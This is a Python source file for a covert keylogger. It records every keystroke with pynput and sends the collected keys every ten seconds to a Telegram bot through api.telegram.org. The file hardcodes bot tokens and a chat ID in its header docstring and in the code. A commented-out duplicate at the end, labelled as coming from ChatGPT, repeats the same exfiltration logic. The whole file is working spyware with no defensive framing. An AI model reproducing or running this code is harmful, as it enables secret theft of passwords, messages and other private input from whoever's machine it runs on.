""" 
http://api.telegram.org/<token>/sendMessage?chat_id=<chat id>&text=hacked
https://api.telegram.org/bot5818555834:AAGBOPJiR9c4oVlLAfi1eJk2GbsQXmiGJGg/sendMessage?chat_id=921245059&text=hacked
token (k3tonbot) = 5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4
chat_id = 921245059
"""
from pynput import keyboard
import time, threading, requests


data = ''
def log(key): #capturing the keys and appending it into data
    global data
    data = data + '['+str(key)+']'
    # print(data)
def send_log(): 
#we need to run this func also at the same time with log, so need to use multithreading.
# what this func do is wait for 5 sec and send whatever in data is and then empty the data again
    while True:
        global data
        time.sleep(10)
        if data != '':
            url = f"https://api.telegram.org/bot5818555834:AAGBOPJiR9c4oVlLAfi1eJk2GbsQXmiGJGg/sendMessage?chat_id=921245059&text={data}"
            requests.get(url)
        data = ''

key_thread = threading.Thread(target=send_log)
key_thread.start()
# now we have to call log func each time a key is pressed, so on_press is used for this
listner = keyboard.Listener(on_press=log) #listner object from the keyword library 
with listner:
    listner.join() #keeps running the listner object until the program is terminated.







































































# -------------------------------------------------------------------------------
# From chatGPT

# from pynput import keyboard
# import time
# import threading
# import requests

# data = ''

# def log(key):
#     global data
#     data = data + '[' + str(key) + ']'

# def send_log():
#     while True:
#         global data
#         time.sleep(10)  # Change this to your preferred interval (in seconds)
#         if data != '':
#             # Modify this URL to use your Telegram bot token and chat ID
#             url = f"https://api.telegram.org/bot5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4/sendMessage?chat_id=921245059&text={data}"
#             requests.get(url)
#         data = ''

# if __name__ == "__main__":
#     key_thread = threading.Thread(target=send_log)
#     key_thread.start()
#     listener = keyboard.Listener(on_press=log)
#     listener.start()
#     listener.join()
